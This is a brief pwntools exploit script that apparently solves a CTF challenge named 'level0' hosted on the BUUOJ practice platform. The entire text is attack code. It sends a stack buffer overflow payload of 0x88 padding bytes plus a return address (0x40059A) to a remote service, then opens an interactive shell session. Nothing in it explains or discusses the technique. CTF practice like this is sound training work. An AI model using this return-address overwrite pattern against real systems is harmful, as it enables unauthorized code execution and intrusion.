from pwn import *
#io = process("./level0")
io = remote("node3.buuoj.cn", 28745)
payload = b'a'*(0x88) + p64(0x40059A)
io.send(payload)
io.interactive()